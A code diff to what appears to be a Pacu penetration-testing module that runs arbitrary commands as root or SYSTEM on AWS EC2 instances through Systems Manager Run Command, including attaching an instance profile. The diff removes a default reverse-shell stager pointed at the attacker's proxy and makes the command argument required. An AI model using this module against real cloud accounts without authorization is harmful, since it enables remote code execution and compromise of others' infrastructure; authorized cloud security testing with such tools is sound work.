@@ -20,10 +20,10 @@ module_info = {
     'one_liner': 'Tries to execute code as root/SYSTEM on EC2 instances.',
 
     # Full description about what the module does and how it works
-    'description': 'This module tries to execute arbitrary code on EC2 instances as root/SYSTEM using EC2 Systems Manager. To do so, it will first try to enumerate EC2 instances that are running operating systems that have the Systems Manager agent installed by default. Then, it will attempt to find the Systems Manager IAM instance profile, or try to create it if it cannot find it. If successful, it will try to attach it to the instances enumerated earlier. Then it will use EC2 Run Command to execute arbitrary code on the EC2 instances as either root (Linux) or SYSTEM (Windows). If PacuProxy is listening and no command argument is passed in, then by default, this module will execute a PacuProxy stager on the target hosts to get a PacuProxy agent to route commands through/give you shell access. Note: Linux targets will run the command using their default shell (bash/etc.) and Windows hosts will run the command using PowerShell, so be weary of that when trying to run the same command against both operating systems. NOTE: Sometimes Systems Manager Run Command can delay the results of a call by a random amount. I have experienced 15 minute delays before my command was executed on the target, so if this module successfully completes and it seems that your command did not execute like it was supposed to, then wait at least 15 minutes before trying again.',
+    'description': 'This module tries to execute arbitrary code on EC2 instances as root/SYSTEM using EC2 Systems Manager. To do so, it will first try to enumerate EC2 instances that are running operating systems that have the Systems Manager agent installed by default. Then, it will attempt to find the Systems Manager IAM instance profile, or try to create it if it cannot find it. If successful, it will try to attach it to the instances enumerated earlier. Then it will use EC2 Run Command to execute arbitrary code on the EC2 instances as either root (Linux) or SYSTEM (Windows). Note: Linux targets will run the command using their default shell (bash/etc.) and Windows hosts will run the command using PowerShell, so be weary of that when trying to run the same command against both operating systems. NOTE: Sometimes Systems Manager Run Command can delay the results of a call by a random amount. I have experienced 15 minute delays before my command was executed on the target, so if this module successfully completes and it seems that your command did not execute like it was supposed to, then wait at least 15 minutes before trying again.',
 
     # A list of AWS services that the module utilizes during its execution
-    'services': ['EC2'],
+    'services': ['EC2', 'SSM'],
 
     # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
     'prerequisite_modules': ['ec2__enum', 'iam__enum_users_roles_policies_groups'],
@@ -34,7 +34,7 @@ module_info = {
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
-parser.add_argument('--command', required=False, default=None, help='The shell command to run on the targeted EC2 instances. If no command is specified AND PacuProxy is listening, the default will be to run a PacuProxy stager against each target')
+parser.add_argument('--command', required=True, default=None, help='The shell command to run on the targeted EC2 instances')
 parser.add_argument('--target-os', required=False, default='All', help='This argument is what operating systems to target. Valid options are: Windows, Linux, or All. The default is All')
 parser.add_argument('--all-instances', required=False, default=False, action='store_true', help='Skip vulnerable operating system check and just target every instance')
 parser.add_argument('--target-instances', required=False, default=None, help='A comma-separated list of instances and regions to set as the attack targets in the format of instance-id@region,instance2-id@region...')
@@ -44,7 +44,6 @@ parser.add_argument('--ip-name', required=False, default=None, help='The name of
 
 def main(args, pacu_main):
     session = pacu_main.get_active_session()
-    proxy_settings = pacu_main.get_proxy_settings()
 
     ###### Don't modify these. They can be removed if you are not using the function.
     args = parser.parse_args(args)
@@ -64,15 +63,6 @@ def main(args, pacu_main):
     # Make sure --all-instances and --target-instances are not passed in together
     if args.all_instances is True and args.target_instances is not None:
         print('Invalid arguments received. Expecting one or zero of --all-instances and --target-instances, received both.\n')
-        return
-
-    # If no command was passed in and PacuProxy is listening, set the command
-    # to be executed to a PacuProxy stager
-    if args.command is None and proxy_settings.listening is True:
-        pp_ps_stager = pacu_main.get_proxy_stager(proxy_settings.ip, proxy_settings.port, 'ps')
-        pp_sh_stager = pacu_main.get_proxy_stager(proxy_settings.ip, proxy_settings.port, 'sh')
-    elif args.command is None and proxy_settings.listening is False:
-        print('Invalid arguments received. No command argument was passed in and PacuProxy is not listening, so there is no default. Either start PacuProxy and run again or run again with the --command argument.\n')
         return
 
     if fetch_data(['EC2', 'Instances'], module_info['prerequisite_modules'][0], '--instances') is False:
@@ -441,15 +431,9 @@ def main(args, pacu_main):
 
             # Windows
             if len(windows_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'windows'):
-                # If a shell command was passed in, run it. Otherwise, try to run a PacuProxy stager
-                if args.command is not None:
-                    params = {
-                        'commands': [args.command]
-                    }
-                else:
-                    params = {
-                        'commands': [pp_ps_stager]
-                    }
+                params = {
+                    'commands': [args.command]
+                }
                 response = client.send_command(
                     InstanceIds=windows_instances_to_attack,
                     DocumentName='AWS-RunPowerShellScript',
@@ -461,15 +445,9 @@ def main(args, pacu_main):
 
             # Linux
             if len(linux_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'linux'):
-                # If a shell command was passed in, run it. Otherwise, try to run a PacuProxy stager
-                if args.command is not None:
-                    params = {
-                        'commands': [args.command]
-                    }
-                else:
-                    params = {
-                        'commands': [pp_sh_stager]
-                    }
+                params = {
+                    'commands': [args.command]
+                }
                 response = client.send_command(
                     InstanceIds=linux_instances_to_attack,
                     DocumentName='AWS-RunShellScript',
